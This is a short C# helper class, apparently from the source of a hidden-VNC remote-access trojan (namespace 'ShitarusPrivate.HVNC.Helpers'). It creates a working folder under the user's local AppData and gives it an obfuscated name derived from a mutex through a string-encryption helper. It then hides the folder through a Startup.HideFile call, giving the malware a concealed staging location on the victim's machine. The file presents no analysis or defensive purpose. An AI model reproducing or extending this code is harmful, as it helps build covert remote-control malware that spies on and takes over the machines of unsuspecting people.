using System;
using System.IO;

namespace ShitarusPrivate.HVNC.Helpers
{
    public sealed class Paths
    {
        public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string Lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static string InitWorkDir()
        {
            string text = Path.Combine(Lappdata, StringsCrypt.GenerateRandomData(Config.Mutex));
            if (Directory.Exists(text))
            {
                return text;
            }
            Directory.CreateDirectory(text);
            Startup.HideFile(text);
            return text;
        }
    }
}
